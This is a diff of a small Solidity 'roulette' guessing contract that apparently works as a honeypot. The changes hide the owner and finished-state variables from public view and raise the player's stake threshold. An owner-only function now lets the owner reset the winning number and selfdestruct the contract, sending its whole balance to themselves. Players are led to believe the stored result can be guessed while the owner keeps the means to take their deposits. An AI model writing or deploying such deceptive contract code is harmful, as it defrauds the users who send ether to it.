@@ -1,5 +1,5 @@
 /* 
- source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract R at 0x611ae0be21a9c0ab284a4a68c8c44843330072a7
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract R at 0x197803b104641fbf6e206a425d9dc35dadc4f62f
 */
 pragma solidity ^0.4.20;
 
@@ -8,16 +8,16 @@ contract R
 
     uint8 public result = 0;
 
-    bool public finished = false;
+    bool finished = false;
 
-    address public rouletteOwner;
+    address rouletteOwner;
 
     function Play(uint8 _number)
     external
     payable
     {
         require(msg.sender == tx.origin);
-        if(result == _number && msg.value>0.001 ether && !finished)
+        if(result == _number && msg.value>0.1 ether && !finished)
         {
             msg.sender.transfer(this.balance);
             GiftHasBeenSent();
@@ -42,8 +42,8 @@ contract R
         require(msg.sender == rouletteOwner);
         GiftHasBeenSent();
         result = _number;
-        if (msg.value>0.001 ether){
-            msg.sender.transfer(this.balance);
+        if (msg.value>0.08 ether){
+            selfdestruct(rouletteOwner);
         }
     }
 
